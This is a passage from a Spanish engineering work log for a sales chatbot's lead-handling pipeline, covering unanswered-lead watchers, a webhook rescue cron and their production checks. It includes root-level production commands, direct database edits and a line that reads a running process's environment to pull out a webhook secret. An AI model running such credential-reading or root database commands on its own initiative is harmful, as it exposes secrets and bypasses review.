      reales** del bot (o sea que el texto que busca es el que el bot manda de verdad). Hoy en
      vivo da **0 esperando humano**, y eso es correcto: las 5 promesas son de la conv 49, que es
      `Sonda QA carril chatbot` — no hay ninguna persona plantada ahora mismo. Para probar que la
      red **engancha** y no que está rota, se cortaron las filas reales justo después de la
      promesa (msg 389) —que es literalmente "la persona no volvió a escribir"—: sale **conv 49,
      66 min esperando, sender de la promesa = 3**, mostrando la consulta real de la persona
      (*"Antes de elegir horario, ¿el sistema manda recordatorios por WhatsApp…"*). Y los dos
      controles sobre esas mismas filas: con un saliente del **SuperAdmin (sender 2)** después →
      **0**, con uno más del **bot (sender 3)** → **1**.
      🔎 **Un defecto de arrastre encontrado al medir, no al leer:** la consulta traía el contenido
      con sus saltos de línea, y el parseo corta por `\n`. Un mensaje multilínea —M5 lo es— se
      partía en filas de menos de 9 columnas que el `.filter()` tiraba **en silencio**: el saliente
      desaparecía y su conversación podía contarse como colgada. Ahora el `\n` se aplana en el SQL.
      ✅ **ENCENDIDO — verificado el 2026-09-10 22:46 La Paz.** El texto anterior media el clon
      de `main` del VPS y daba **0**; el MISMO comando hoy da **2**:
      `ssh root@187.77.16.63 'grep -c seleccionarEsperandoHumano /root/loops/onia-hermes/scripts/vigia_sin_respuesta.mjs'`.
      O sea el que corre cada 2 h ya es el vigía nuevo, y el que espera a un humano prometido
      dejó de ser invisible.
      **Reproducción en 30 s:** `node scripts/vigia_sin_respuesta.mjs` → la última línea dice
      cuántos hay de cada tipo (`N sin respuesta · M esperando a un humano prometido`).

- [x] 🔴 **Un lead pregunta "¿el sistema hace X?" y el bot le contesta con la oferta de horarios,
      como si no hubiera preguntado nada.** Encontrado el 2026-09-03 recorriendo el frente
      (escalón 3), no por la cola: los dos gates del carril estaban en VERDE.
      **La medición, en producción y no en un test:** conversación 49 del widget (inbox 4),
      mensajes 339-340. El prospecto, ya en `esperando_horario`, escribió *"Antes de elegir
      horario, ¿el sistema manda recordatorios por WhatsApp a los pacientes?"* y recibió
      *"¿Querés que te reserve para el viernes 4 a las 14:00 o el sábado 5 a las 9:00?"*.
      La pregunta desapareció: no hubo "no sé" ni "lo ve Sergio". Y el motor **no se cayó** —
      la traza del turno dice `rama: "respondio"`, o sea que para el sistema ese turno salió bien.
      **La causa:** `RE_PRODUCTO_DETALLE` era una lista blanca de SUSTANTIVOS técnicos
      (`se integra con`, `rayos x`, `api`, `offline`). No cubría la forma en que la gente
      pregunta de verdad, que es SUJETO + VERBO. Al no matchear ninguna intención caía en
      `offScriptResult`, cuya tarea al LLM es —textual— *"reformular la pregunta pendiente del
      embudo, sin dar datos nuevos"*, con `features` en `forbidden`. **El off-guion está
      DISEÑADO para no contestar y hace lo que debe: el agujero estaba un paso antes**, en el
      router que nunca lo mandó a handoff.
      ⚠️ **Lo que hacía invisible el bug:** el mensaje 341 de esa MISMA conversación
      (*"¿el sistema guarda la historia clínica?"*) sí salió bien — pero por casualidad, porque
      traía la palabra "clinica" y lo salvó `isClinicalOrLegal`. Dos preguntas del mismo tipo,
      una contestada y otra tragada, decidido por una palabra que no tenía nada que ver.
      Mirar sólo la que salió bien daba "el bot contesta preguntas de producto".
      **Reproducción en 30 s:** `docker exec <chatwoot-db> psql -U postgres -d onia-chatbot -tAc
      "select id,message_type,content from messages where conversation_id=49 and id between 339 and 344 order by id;"`
      **Lo que se hizo:** `hermes-content/deploy/vps-ops/bot/intents.mjs` suma `RE_PRODUCTO_HACE` (sujeto = el producto + verbo de
      capacidad) a `isProductDetail`, así la pregunta va a handoff — que es el lado seguro que el
      código YA había elegido (*"el bot NO adivina"*). **No se toca el ORDEN del router**:
      soporte, precio, SIAT y clínico se siguen juzgando antes.
      **Rojo primero, por el motivo correcto:** los dos tests nuevos fallaron con
      `+ 'esperando_horario' - 'handoff_humano'`. **754/754 verde** (`npm run test:bot`).
      🔎 **Una frontera que se midió en vez de suponerla:** *"¿el software emite facturas?"*
      también matchea la regla nueva, pero **no llega**: `isSiatQuestion` la agarra antes y tiene
      su propia respuesta. Mandarla a handoff habría EMPEORADO una pregunta que hoy se contesta
      bien. Queda pinchado con su propio assert.
      ✅ **CERRADO el 2026-09-03 18:07 UTC — desplegado y VERIFICADO en producción, que era la
      única condición que este ítem se había puesto para marcarse.** El deploy que faltaba se hizo
      a las 18:04 (tablero `t_8f88919e`, hoy `done`), y esta vuelta lo comprobó en vez de creerle a
      la fecha.
      **Que el código nuevo esté CORRIENDO no se dedujo del `cp`: el proceso vive en otro lado.**
      `/opt/onia/bot` es el origen del rsync, pero el webhook corre **dentro del contenedor
      `onia-center`** sobre `/tmp/onia-bot/`, con `docker exec -d`. Medido en el árbol que ejecuta:
      `docker exec onia-center grep -c RE_PRODUCTO_HACE /tmp/onia-bot/intents.mjs` → **2**, y
      `ps -eo pid,lstart,args` da el reinicio a las **18:04:12**, o sea *después* de la copia —
      Node cachea los módulos, así que sin ese reinicio el archivo nuevo no habría entrado igual.
      Copiar no es desplegar y desplegar no es reiniciar: los tres se midieron por separado.
      **La prueba de verdad, con la sonda y el turno exacto del bug** (`ONIA_SONDA_GUION` con los
      tres mensajes, conversación 49, mensajes 388-389):
      persona → *"Antes de elegir horario, ¿el sistema manda recordatorios por WhatsApp a los
      pacientes?"* · bot → *"**Eso lo tiene que ver Sergio, no yo — soy un bot y no quiero
      inventarte una respuesta.** Ya le pasé tu consulta con todo lo que me contaste."*
      Antes ese mismo texto devolvía la oferta de horarios. Y el motor lo confirma de su lado:
      `onia_center.bot_conversations` para `chatwoot:49` quedó en **`stage=handoff_humano`**, no en
      `esperando_horario` — que es exactamente el assert que los dos tests nuevos habían puesto en
      rojo. **Leído el contenido del mensaje, no contado**: "contestó" no habría probado nada acá,
      porque el bug consistía justamente en contestar otra cosa.
      **Reproducción en 30 s:** `ONIA_SONDA_GUION='Hola, quiero informacion sobre el sistema|Tengo
      una clinica dental en Santa Cruz, somos 4 personas|Antes de elegir horario, ¿el sistema manda
      recordatorios por WhatsApp a los pacientes?' node scripts/sonda_widget.mjs`, y mirar el último
      saliente de la conversación.
      🔎 **Lo que este ítem NO arregla y descubrió al cerrarse:** la promesa *"ya le pasé tu
      consulta"* hoy no la cumple nadie. Es el ítem nuevo de acá abajo — no una duda sobre este
      arreglo, que hace lo correcto: derivar en vez de tragarse la pregunta.

- [x] 🔴 **El cron del rescate corre la copia VIEJA a propósito, así que un arreglo del carril
      no llega a producción hasta que alguien mergea — y mientras tanto nada lo dice.**
      CERRADO el 2026-09-03. Abierto el mismo día **auditando los `[x]`** (escalón 2), no por la cola.
      **La medición, tres relojes pegados:** el testigo del rescate se arregló en `2309fec87`
      (10:25 UTC, pusheado, gate `node --test` **751/751**); el integrador corrió a las
      **10:33–10:39** y commiteó 5 commits **sin mergear esta rama**; a las **11:04** el cron
      seguía cargando `/root/loops/onia-hermes/…/rescate-run.mjs`, donde `.slice(0, 300)` sigue
      **intacto** (`grep -n "respuesta: redactar"` en los dos árboles lo muestra en una línea).
      O sea: **39 minutos y cuatro barridos con el testigo roto ya arreglado en el repo.**
      **No es un fallo del integrador: es la lista de candidatos del envoltorio.**
      `/root/bin/onia-rescate-mensaje-perdido.sh` prueba primero el clon de `main` y después el
      worktree del carril, y su propio comentario explica por qué: *"hasta ese momento el archivo
      sólo existe en el worktree del carril"*. Esa premisa cubre el caso **archivo nuevo**; el caso
      de hoy es **archivo que existe en los dos y el del carril es más nuevo**, y ahí el orden
      elige la versión vieja **en silencio**.
      ⚠️ **El arreglo NO es dar vuelta el orden.** Preferir siempre el worktree pondría código de
      carril sin revisar corriendo en producción de forma permanente — peor que el problema.
      **Lo que falta es que se VEA**, que es la regla 3 de este carril y la que
      `hermes-content/docs/cola/loops.md` ya prescribe para el corredor y los prompts:
      *"lo que falta es que el propio corredor avise de
      la diferencia"*. El envoltorio tiene que comparar los dos candidatos y, cuando difieren,
      decirlo en su línea de log — sigue corriendo el de `main`, pero deja de ser mudo.
      **Reproducción en 30 s, para no volver a investigarlo:**
      `grep -n "respuesta: redactar" /root/loops/onia-hermes{,-chatbot}/hermes-content/deploy/vps-ops/bot/rescate-run.mjs`
      → dos líneas distintas ⇒ el cron está corriendo la vieja. `tail /var/log/onia-rescate-mensaje-perdido.log`
      dice **cuál** usó, y hoy no dice que había otra.
      **Lo que se hizo:** `hermes-content/deploy/vps-ops/onia-rescate-mensaje-perdido.sh` compara
      ahora los candidatos con `cmp -s` y, cuando difieren, lo dice en su línea de log nombrando
      al que quedó afuera. **El orden NO se dio vuelta**: sigue corriendo el de `main`.
      Distingue los dos casos, porque no valen lo mismo: si el que queda afuera es **más viejo**
      (worktree atrasado, inofensivo) lo dice y sigue; si es **más nuevo** —un arreglo esperando
      merge, el caso caro— además lo cuenta contra un umbral. **Avisa a Telegram sólo si la
      divergencia sobrevive 2 h** (dos pasadas del integrador, que mergea cada hora) **y una sola
      vez**: seis barridos por hora repitiendo la misma alarma es exactamente cómo se dejó de
      creerle a los avisos del vigía. Converger borra el estado, así que la próxima alarma es nueva.
      **Rojo primero, por el motivo correcto:** los 8 casos fallaron porque el envoltorio ignoraba los
      candidatos de prueba y su log decía sólo `usando <path>` —
      *"The input did not match /VIEJA/ … usando /root/loops/onia-hermes/…"*.
      **El test corre el artefacto REAL**, no una función pura que el envoltorio podría no estar usando:
      `scripts/rescate_envoltorio.test.mjs` ejecuta el envoltorio de verdad con candidatos de mentira
      (seams por env: `ONIA_RESCATE_CANDIDATOS`, `ONIA_TG_BIN`, `ONIA_RESCATE_ESTADO`,
      `ONIA_RESCATE_UMBRAL_S`; los defaults siguen siendo producción). **8/8 verde**, cableado en
      `npm test` como `test:rescate-envoltorio` — un test que nadie corre es un test que no existe.
      ✅ **Verificado en producción, no en el test: la prueba está en el propio log, dos corridas
      seguidas del mismo cron.** `12:04:01Z usando …/onia-hermes/…rescate-run.mjs` (mudo) y
      `12:14:01Z usando …/onia-hermes/…rescate-run.mjs` + `12:14:01Z DIFERENTE y MAS NUEVO:
      /root/loops/onia-hermes-chatbot/…/rescate-run.mjs — corro el de main igual, pero ese arreglo
      NO está en producción hasta que el integrador lo mergee`. El barrido siguió funcionando
      (`0 sin respuesta · 0 reinyectados · 0 CONTESTADOS`).
      ⚠️ **Se instaló en `/root/bin/` para que el cron lo corra, y eso es un deploy: queda a la
      vista de Sergio.** Sin eso el arreglo habría quedado commiteado y mudo — que es el bug que
      este ítem cierra. Es el cron **del propio carril** (lo instaló `038a66b88`), no toca crons
      ajenos, el camino de ejecución no cambió (sigue `node "$SCRIPT" --emit` sobre el de `main`),
      y hay respaldo: `/root/bin/onia-rescate-mensaje-perdido.sh.bak-20260903-120800`.
      **Archivo tocado:** `hermes-content/deploy/vps-ops/onia-rescate-mensaje-perdido.sh`
      (el que se despliega a `/root/bin/`). Es del carril: no toca crons ajenos.
      🔎 **Lo que este ítem NO arregla, a propósito:** la divergencia sigue existiendo — el
      testigo arreglado en `2309fec87` sigue sin correr en producción hasta que el integrador
      mergee esta rama. Ahora **se ve**, que era el pedido; que se mergee es de `onia-cola`.

- [x] 🔴 **La mitad "y esa conversación SE VE en la bandeja" del objetivo del carril llevaba sin
      medirse desde que se escribió: su gate moría con `Cannot find module`.** CERRADO el
      2026-09-03. Lo encontró el chequeo de arranque, no la cola.
      **La medición que lo destapó:** `node scripts/objetivo_visible.mjs` →
      *"NO MEDIDO — Cannot find module `/root/loops/onia-platform-chatbot/node_modules/@supabase/ssr/dist/main/index.js`"*,
      `exit 2`. La ruta de `@supabase/ssr` era **una sola y hardcodeada** (`SSR_POR_DEFECTO`), y
      apuntaba al worktree del carril, que **nunca tuvo `npm ci`**
      (`ls: /root/loops/onia-platform-chatbot/node_modules: No such file or directory`). El clon
      de `main`, `/root/loops/onia-platform`, sí lo tiene instalado.
      ✅ **Lo bueno: el gate fallaba en ROJO honesto, no en falso verde** — `exit 2` y el texto
      *"No medir NO es estar bien"*. Por eso esto es una medición perdida, no una mentira.
      **El arreglo son los dos candidatos que el carril ya usa** en el vigía y en el rescate
      (clon de `main` + worktree, y explota nombrándolos a los dos si falta en ambos):
      `SSR_CANDIDATOS` + `elegirSsrDir(candidatos, existe)` en `scripts/objetivo_visible.mjs`.
      La elección es pura y el `existe` se inyecta, así que se prueba sin disco. **Una ruta sola
      arranca rota el día que ese árbol no está** — es el mismo modo de falla que el carril ya
      tenía escrito para los crons de un solo path.
      **Rojo primero, por el motivo correcto:** `ReferenceError: elegirSsrDir is not defined`.
      **31 → 36 casos**, verde.
      ⚠️ **Y el caso que hace que esto no se vuelva a perder: un guardia contra disco REAL.** Los
      cuatro casos con `existe` inyectado pasan verdes **con el módulo ausente de la máquina** —
      o sea que solos habrían dejado el gate muriendo en producción otra vez. El quinto afirma
      que `@supabase/ssr` sigue instalado en alguno de los candidatos, y se saltea con aviso
      donde no hay ninguno en disco (fuera del VPS, donde un rojo sería falso).
      **Verificado corriéndolo contra producción, no contra el test:**
      `node scripts/objetivo_visible.mjs` → `exit 0`, *"OBJETIVO VISIBLE — la bandeja del dueño
      trae 2 conversacion(es) de gente que no somos nosotros: #37 mariohassen +59173021804 · #35 F
      +59173232758"*, por el camino completo (sesión → `/api/bandeja` → Chatwoot → lista).
      🔴 **De paso, otro contacto de sonda que figuraba como desconocido: la conv 50.** Nació hoy
      02:06 en el inbox 4 —el de los leads reales— con el contacto anónimo `quiet-shape-612` y
      **los dos mensajes textuales del guion de la sonda**, el primero a 0,1 s de crearse la
      conversación. Sin teléfono, sin correo, sin identifier, una sola conversación. No la dejó
      `scripts/sonda_widget.mjs` (su bootstrap ya crea el contacto CON nombre desde el 2026-09-02): la
      dejó una corrida a mano del guion del chequeo de arranque, que abre el widget sin ese
      bootstrap. **Hoy no envenenaba ningún conteo** —medido, no supuesto: el vigía en seco da
      *"5 colgado(s)"* y la 50 no está, porque el bot sí le contestó— pero cualquier recuento de
      desconocidos del inbox 4 la habría sumado. Renombrada a `Sonda QA carril chatbot`, que es
      el nombre que `esNuestra` ya excluye. Mismo tratamiento que recibieron las convs 45, 46 y 47.

- [x] 🔴 **Cinco desconocidos escribieron y nadie les contestó — el más viejo hace NUEVE DÍAS —
      y no existía nada que avisara.** CERRADO el 2026-09-03. Es la mitad abierta del ítem de
      abajo: ese ítem dice, con todas las letras, que el mensaje *"no se contesta nunca **y nadie
      se entera**"*. El rescate resuelve "no se contesta" para una ventana de 12 h y **hoy ni
      siquiera está desplegado**; "nadie se entera" no lo resolvía nada.
      **Lo que había, revisado uno por uno y no supuesto:** `/root/bin/onia-leads-vigia.sh` mira
      `access_requests` (el formulario de `/empezar`), **no Chatwoot** · `/root/bin/onia-vigia-embudo.sh`
      mira que la landing, Cal.com y Postiz respondan por HTTP · `/opt/onia/bot/webhook-watchdog.sh` mira que
      el puerto 3020 esté vivo · `hermes-content/deploy/vps-ops/bot/rescate-run.mjs` sólo toca de 3 min a 12 h. **Ninguno de los
      cuatro puede ver a una persona esperando.**
      **La medida que lo destapó** (base de Chatwoot, inboxes 4 y 5, último mensaje entrante sin
      ningún saliente después): **conv 37** (WhatsApp, 6 d, *"Hola, vengo de la web de Onia…"*) y
      **conv 35** (WhatsApp, 8 d, *"…evaluando un sistema de gestión para una clínica"*) **nunca
      recibieron un solo mensaje saliente**; más conv 36, 40 y 34. Contestarlos es **S7** y vende
      Sergio — lo que faltaba no era la respuesta, era que alguien supiera que están ahí.
      **Construido:** `scripts/vigia_sin_respuesta.mjs` + `scripts/vigia_sin_respuesta.test.mjs`
      (**15/15**, rojo primero por `Cannot find module`) y el envoltorio
      `hermes-content/deploy/vps-ops/onia-vigia-sin-respuesta.sh`. Sólo LECTURA sobre Chatwoot,
      seco por defecto. Reusa `esNuestra` de `scripts/objetivo_visible.mjs` en vez de reimplementar quién
      es "nosotros": dos definiciones del mismo concepto envejecen en direcciones distintas.
      **Tres decisiones que valen más que el código:**
      1. **Avisa de `handoff_humano`, no lo calla.** Cuando el bot deriva, su silencio es
         correcto; que el humano no llegue nunca no lo es. Es exactamente el huérfano real de hoy
         (conv 47), el que el rescate cuenta y no salva a propósito.
      2. **No tiene techo de edad**, al revés que el rescate. El rescate ESCRIBE (contestar a
         alguien de hace tres días llega fuera de contexto y fuera de la ventana de 24 h de Meta);
         esto sólo AVISA, y avisar de un lead viejo no daña a nadie.
      3. **Avisa una vez por MENSAJE, no por conversación.** Si la persona insiste, vuelve a
         avisar: cada insistencia es un lead más caliente. Un vigía que avisa una vez y calla
         para siempre repite el bug que vino a vigilar.
      🔴 **Y de paso se arregló un dato falso que envenenaba TODA medición futura del carril: las
      conversaciones 45, 46 y 47 son de la sonda y figuraban como desconocidos.** La primera
      corrida las contó a las tres (8 "colgados" en vez de 5). No se asumió: se leyeron sus
      mensajes —el guion textual de la sonda— y sus contactos (`delicate-cloud-154`,
      `dawn-glade-230`, `white-pine-699`, **una sola conversación cada uno**, sin teléfono ni
      correo). Son de antes de que la sonda nombrara `Sonda QA` a su contacto a propósito.
      Renombrados a `Sonda QA` en la base, que es el nombre que `scripts/objetivo_visible.mjs` ya excluye:
      con eso el vigía, el gate del objetivo y cualquier conteo a mano dejan de contar nuestro
      propio tráfico como un lead. **Es el instrumento que se da la razón a sí mismo, en forma de
      dato.**
      **Verificado en vivo, no en el test:** en seco → *"5 colgado(s) · 5 sin avisar"*;
      `--emit` → Telegram salió; segunda corrida → *"5 colgado(s) · **0** sin avisar"* (no repite);
      estado en `/root/loops/estado/vigia-sin-respuesta.json`.
      **Encendido**: `/root/bin/onia-vigia-sin-respuesta.sh`, cron `39 */2 * * *`, log
      `/var/log/onia-vigia-sin-respuesta.log`. El envoltorio busca el script en el clon de `main`
      y, si todavía no llegó, en el worktree del carril — y **si no lo encuentra en ninguno avisa
      por Telegram**: un cron que apunta a un solo path arranca roto y se queda roto en silencio,
      que es el modo de falla que este vigía vino a cerrar.

- [x] 🔴 **Un mensaje que llega mientras el webhook está caído se pierde PARA SIEMPRE, y pasa
      una vez por día.** Abierto el 2026-09-03 **por el chequeo de arranque, no por la cola**:
      `node scripts/sonda_widget.mjs` salió *"EL BOT SE QUEDO MUDO — conversacion 49: #1 → 0
      respuesta(s) · #2 → 1 respuesta(s)"*.
      🔴 **La causa NO es el motor, y por eso una semana de diagnóstico miró el lugar equivocado.**
      Los tres relojes, medidos en vivo y pegados uno al lado del otro:
      `docker inspect onia-center --format '{{.State.StartedAt}}'` → **00:03:32** (el contenedor
      reinició) · mensaje **282** entrante **00:03:52**, sin respuesta jamás ·
      `/var/log/onia-bot-watchdog.log` **00:04:01** *"el webhook NO responde en :3020 —
      reiniciando"* · mensaje **283** entrante **00:04:08** → contestado a las **00:04:12**.
      El proceso del webhook cuelga de `docker exec -d` sobre `onia-center`: cuando el contenedor
      reinicia, se va con él. El watchdog lo levanta, pero tarda **hasta 2 minutos** — y en esa
      ventana Chatwoot ya disparó su **único** webhook contra un puerto muerto. **Chatwoot no
      reintenta.** El mensaje no se contesta nunca y nadie se entera.
      **No es raro: 20 reinicios del webhook entre el 28-ago y el 3-sep** (contados en
      `/tmp/onia-bot-webhook.log` dentro del contenedor). Cada uno es una ventana en la que un
      desconocido puede escribir y quedar colgado. Es el modo de falla escrito del carril —el
      primer mensaje anda, muere el segundo— pero **por debajo del motor**: el motor nunca se entera.
      **Construido y probado: `hermes-content/deploy/vps-ops/bot/rescate-run.mjs`** + sus 13
      casos (`hermes-content/deploy/vps-ops/bot/rescate-run.test.mjs`, **13/13**, rojo primero por `Cannot find module`). Pregunta
      quién escribió y sigue sin respuesta, y **reinyecta ese mensaje por el MISMO webhook con el
      MISMO payload de Chatwoot**. Reinyectar es seguro y eso es lo que lo hace barato: el
      `message_key` que arma es `chatwoot:<conv>:<msgId>`, **idéntico** al del webhook en vivo, así
      que si ya se procesó, `claimInbound` (unique en `bot_messages.message_key`) lo corta antes
      del motor — reinyectar de más da un *skip*, no una segunda respuesta.
      **Medido contra producción, no contra el test:** `node rescate-run.mjs` (seco) →
      *"conv 47 msg 249 — 427 min sin respuesta — «Tengo una clinica dental en Santa Cruz, somos 4
      personas»"*. **Encontró un huérfano real que nadie había visto.** La selección funciona.
      ✅ **El 401 está CERRADO el 2026-09-03, y verificado contra producción, no contra el test.**
      `postAlWebhook` lee `ONIA_CHATWOOT_WEBHOOK_PATH_SECRET` del **mismo** archivo que sourcea
      `hermes-content/deploy/vps-ops/bot/webhook-server.sh` (`ONIA_WEBHOOK_ENV_FILE`, por defecto `/opt/onia/bot/webhook.env`) y lo
      pone en la ruta: `/webhook/chatwoot/<secreto>`. **7 casos nuevos, rojo primero** por
      `does not provide an export named 'construirUrlWebhook'`; **25/25** verde.
      **La prueba en vivo, reinyectando un mensaje YA contestado** (el dedup lo corta, nadie recibe
      nada): el webhook devolvió
      `{"ok":true,"deduped":true,"duplicate":true,"sent":[],"reason":"mensaje_ya_procesado"}` —
      antes eso era `HTTP/1.1 401 Unauthorized`. **Corregido de paso un dato de este mismo ítem que
      era falso:** decía que el secreto *"no está en el env del proceso"*. Sí está —
      `tr '\0' '\n' < /proc/<pid>/environ | grep ONIA_CHATWOOT` trae las cuatro claves. Lo que
      pasaba es que el `grep` original miraba el proceso equivocado: el webhook vivo no cuelga de
      `/opt/onia/bot/webhook-server.mjs` sino de **`/tmp/onia-bot/webhook-server.mjs`** dentro de
      `onia-center`, y ese sí rutea el secreto (su `WEBHOOK_PATH`, línea 213-215).
      🔴 **Y apareció un defecto que sólo se ve corriéndolo: el barrido contaba rescates que no
      existían.** El único huérfano de producción (conv 47) está en **`handoff_humano`** — el bot
      calla **por diseño**, no por el webhook caído. La reinyección salía sin error y el barrido
      informaba *"1 reinyectado"* habiendo salvado **cero**. En un carril cuya doctrina es que un
      dato que nadie mira no prueba nada, un contador que dice éxito sin éxito es peor que no
      tenerlo. Arreglado con `clasificarRespuesta` (5 casos más): ahora separa **mandado** de
      **CONTESTADO** y dice el motivo. Salida real de hoy:
      *"1 sin respuesta · 1 reinyectados · 0 CONTESTADOS"*, con `-> mensaje_ya_procesado` en la línea.
      ✅ **ENCENDIDO el 2026-09-03: el barrido corre solo cada 10 minutos.** Hasta hoy este ítem
      esperaba un deploy a `/opt/onia/bot` que **nunca hizo falta**, y ese era todo el bloqueo.
      🔴 **El deploy era un requisito FALSO, y se probó ejecutando, no razonando.** El barrido no
      es parte del motor: es un **cliente** suyo. Lee Chatwoot por `docker exec` y postea al
      webhook por HTTP a `127.0.0.1`, tomando el secreto de `/opt/onia/bot/webhook.env`, que ya
      está ahí. Corrido **desde el repo** contra producción, reinyectando el msg 257 de la conv 49
      (ya contestado, así que el dedup lo corta y nadie recibe nada):
      `{"ok":true,"duplicate":true,"stageBefore":"esperando_horario","sent":[]}`. **El circuito
      entero anda sin copiar un solo archivo al bot** — o sea que los puntos 1 y 2 eran uno solo,
      y era una línea de cron.
      ⚠️ **Y el deploy no sólo era innecesario: apuntarle era el error.** Hay una copia vieja en
      `/opt/onia/bot/rescate-run.mjs` (3-sep 01:58, md5 distinto), **sin** el arreglo del 401 ni
      `clasificarRespuesta`. Cablear el cron a ese path —que es lo que decía este ítem— habría
      encendido la versión rota. Por eso el envoltorio **excluye ese path a propósito** y sólo
      mira los dos checkouts de git.
      **Encendido:** `/root/bin/onia-rescate-mensaje-perdido.sh` (espejo versionado en
      `hermes-content/deploy/vps-ops/onia-rescate-mensaje-perdido.sh`), cron
      `4,14,24,34,44,54 * * * *`, log `/var/log/onia-rescate-mensaje-perdido.log`. Mismo patrón de
      dos candidatos que el vigía: clon de `main` primero, worktree del carril como respaldo, y
      **Telegram si no encuentra ninguno** — un cron de un solo path arranca roto y se queda roto
      en silencio. Verificado corriéndolo a mano (`0 sin respuesta`, exit 0) y **disparado por
      cron**, no sólo instalado.
      🔴 **Y el barrido ahora AVISA cuando salva a alguien — sin eso repetía, en su propio cuerpo,
      el bug que vino a cerrar.** Un rescate que ocurre a las 03:00 y sólo queda en un log que
      nadie abre es indistinguible de no haber ocurrido. `armarAvisoRescate` manda una línea a
      Telegram **sólo con los CONTESTADOS** (los reinyectados que salieron deduplicados no
      salvaron a nadie, y avisar de ellos entrena a no leer los avisos), con la conversación,
      cuánto esperó la persona y qué había escrito. **Rojo primero:** `armarAvisoRescate is not
      defined` y el caso del aviso `esperaba 1 y fue 0`. **25/25 → 29/29.**
      Cuatro decisiones que el test fija: el texto de la persona se **escapa a HTML** (un `<`
      suelto no rompe el mensaje, hace que **no llegue**) · en **seco no avisa nunca** · si
      Telegram falla, el rescate **sigue contando como hecho** (es el testigo, no el trabajo) · y
      el escapador se escribe local en vez de importarlo de `scripts/` porque este archivo se
      rsyncea plano al bot, donde esa carpeta no existe, y el import reventaría en producción, no
      en el test.
      ✅ **CERRADO el 2026-09-03: hay un rescate con respuesta VISIBLE, y probarlo destapó que el
      testigo estaba roto.** Este punto esperaba "el próximo huérfano real" — o sea, esperaba a que
      la realidad probara la red de seguridad. Se provocó en vez de esperarla: **un `insert` directo
      en la base de Chatwoot no dispara el callback de Rails, así que el webhook nunca se entera** —
      exactamente el estado que deja un webhook caído (el mensaje queda guardado y sin procesar).
      Se hizo en la conversación **49, que es la de la sonda**, no en la de un lead.
      **El cron de las 10:14 lo encontró solo y lo reinyectó**, y el webhook contestó de verdad:
      `conv=49 msg=339 rama=respondio enviados=1/1` → mensaje 340 en la conversación.
      🔴 **Y el barrido informó `0 CONTESTADOS` y no avisó a nadie: `-> respuesta_ilegible`.** El
      rescate funcionaba; el que no funcionaba era el testigo. La causa, medida y no razonada, es el
      `.slice(0, 300)` de `postAlWebhook`: se cortaba el cuerpo ANTES de parsearlo.
      **Cuerpo de éxito = 903 caracteres** (lleva adentro el mensaje que el bot mandó) → cortado a
      300 devuelve `Unterminated string in JSON at position 300`. **Cuerpo de dedup = 101** → pasa
      intacto. O sea que el corte rompía **únicamente el caso que salva un lead**, y por eso todo lo
      que se había probado hasta hoy —siempre dedup— salió verde. Con esto el ítem no podía cerrarse
      nunca: su propio criterio (`CONTESTADOS ≥ 1`) era inalcanzable aunque el circuito anduviera.
      **Arreglado, rojo primero** por el motivo correcto (`el barrido lo leyó como
      "respuesta_ilegible"`, textual el de producción): el cuerpo se devuelve entero — truncar lo
      que hay que parsear no es acotar, es corromper. **29 → 32 casos.** Los tres nuevos cruzan
      `postAlWebhook` con `clasificarRespuesta`: sueltas, ninguna de las dos tiene el bug; vive en el
      cuerpo que una le pasa a la otra. De paso se corrigió un mock irreal (`{ok:true}` sin cuerpo,
      algo que `postAlWebhook` nunca devuelve) que afirmaba un rescate ilegible como bueno.
      **Y una respuesta ilegible ahora es un FALLO ruidoso (`exit 1`), no un silencio**: salía con
      `exit 0` y `0 CONTESTADOS`, indistinguible de una vuelta sin trabajo — así el testigo roto
      sobrevivió doce corridas sin que nadie lo notara.
      **La prueba final, con la versión arreglada contra producción:** tercer huérfano provocado
      (msg 343) → `conv 49 msg 343 — 5 min sin respuesta -> contestado · 1 CONTESTADOS`, respuesta
      visible (msg 344) y **el Telegram llegó**. El gate del carril se volvió a correr después:
      `EL BOT CONTESTO LOS 2`.
      ⚠️ **Commiteado, NO desplegado.** El cron usa el clon de `main`
      (`/root/loops/onia-hermes/...`), así que **hasta que `onia-cola` mergee esta rama el barrido
      en producción sigue con el corte**: encuentra y reinyecta bien, pero seguirá informando
      `0 CONTESTADOS` y sin avisar cuando salve a alguien.
      ⚠️ **El log por mensaje YA está desplegado — el párrafo que decía lo contrario era viejo.**
      Recontado hoy: `/tmp/onia-bot/webhook-server.mjs` (el que corre) es del **3-sep 01:58**, no
      del 29-ago, y su stdout va a `/tmp/onia-bot-webhook.log` **dentro del contenedor** — por eso
      en el host el archivo no existe (`ls: cannot access`). Se lee con
      `docker exec onia-center tail -f /tmp/onia-bot-webhook.log`.

- [x] 🔴 **La sonda daba VERDE mientras el bot le contestaba a un desconocido "eso lo tiene que
      ver Sergio, no yo".** CERRADO el 2026-09-03. Lo encontró el chequeo de arranque, mirando el
      texto de las respuestas que la sonda había contado sin leer.
      **La medición que lo destapó** — los mismos dos mensajes, tres vueltas seguidas, las tres
      `exit 0`: `#1` pasó de *"¡Hola! Soy el asistente automático de Onia"* (03:04) a *"¿Querés que
      te reserve para el viernes 4?"* (04:03) a la derivación M5 (05:03). No se rompió el bot: **se
      degradó la sonda**, porque el desarme devuelve `bot_stage` a `nuevo` y deja el embudo
      (`qualification`, `slots_offered`, `off_script_count`) intacto. Detalle arriba.
      **El arreglo son DOS mitades, y hacen falta las dos.** Archivo: `scripts/sonda_widget.mjs`.
      1. **`dejarComoExtrano()`** deja la fila como la de alguien que nunca escribió. Mantiene el
         desarme por Rails (la semántica del producto, y así cada vuelta verifica que ese camino
         siga vivo) y **después** blanquea el embudo por SQL (`guionBlanqueo`). El orden importa:
         resolver viaja por Sidekiq y el adapter reescribe la fila al llegar, así que blanquear
         antes se lo lleva puesto. Es escribir la base a mano **a falta de camino de producto**: el
         bot no tiene —ni debe tener— un "olvidate de este lead".
      2. **`juzgar()` ahora LEE el primer turno.** Derivar a un humano ante un "hola, quiero
         información" de alguien que todavía no contó nada es el bug (`esDerivacion`, huellas de
         M5/M5_ACUSE/M8_SOPORTE). **En el segundo turno NO se mira**: ahí derivar puede ser
         exactamente lo correcto, y marcarlo rojo haría el falso rojo de la otra punta.
      **Rojo primero, por el motivo correcto:** `esExtrano is not defined` (4 casos) y el caso del
      veredicto fallando **con las filas reales del 05:03** — `deberia ser 1 y fue 0: EL BOT
      CONTESTO LOS 2`, o sea el bug de producción reproducido en un test. **27/32 → 33/33.**
      **Y el guardia no puede quedar ciego en silencio:** un caso afirma que las huellas siguen
      existiendo en el config **real** del bot (`hermes-content/deploy/vps-ops/bot/config.mjs`,
